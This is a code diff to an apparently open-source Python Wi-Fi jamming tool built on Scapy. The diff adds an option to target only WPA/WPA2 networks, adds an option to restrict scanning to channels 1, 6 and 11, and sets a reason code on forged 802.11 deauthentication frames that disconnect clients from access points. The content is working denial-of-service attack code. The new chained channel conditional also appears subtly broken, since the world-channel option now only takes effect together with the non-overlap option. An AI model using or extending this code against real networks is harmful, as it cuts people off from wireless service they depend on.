@@ -83,10 +83,18 @@ def parse_args():
                         nargs='*',
                         default=[],
                         help="Enter the SSID or MAC address of a specific access point to target")
+    parser.add_argument("-w",
+                        "--wpa",
+                        help="Only jam WPA/WPA2 networks",
+                        action="store_true")
     parser.add_argument("--world",
                         help="N. American standard is 11 channels but the rest \
                                 of the world it's 13 so this options enables the \
                                 scanning of 13 channels",
+                        action="store_true")
+    parser.add_argument("-o",
+                        "--nonoverlap",
+                        help="Specify channel 1, 6, and 11 for N.American most common channels",
                         action="store_true")
 
     return parser.parse_args()
@@ -258,8 +266,8 @@ def deauth(monchannel):
                 # Append the packets to a new list so we don't have to hog the lock
                 # type=0, subtype=12?
                 if ch == monchannel:
-                    deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
-                    deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
+                    deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=2)
+                    deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth(reason=2)
                     pkts.append(deauth_pkt1)
                     pkts.append(deauth_pkt2)
     if len(APs) > 0:
@@ -353,6 +361,11 @@ def cb(pkt):
             if args.skip:
                 if pkt.addr2 in args.skip:
                     return
+            if args.wpa:
+                if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and (pkt[Dot11Elt].ID == 48 or (pkt[Dot11Elt].ID == 221 and pkt.info.startswith('\x00P\xf2\x01\x01\x00'))):
+                    APs_add(clients_APs, APs, pkt, args.channel, args.world)
+                    return
+
 
             # Check if it's added to our AP list
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
@@ -373,7 +386,7 @@ def APs_add(clients_APs, APs, pkt, chan_arg, world_arg):
     try:
         # Thanks to airoscapy for below
         ap_channel = str(ord(pkt[Dot11Elt:3].info))
-        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11'] if not args.world else ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13'] 
+        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11'] if not args.nonoverlap else ['1', '6', '11'] if not args.world else ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13']
         if ap_channel not in chans:
             return
 
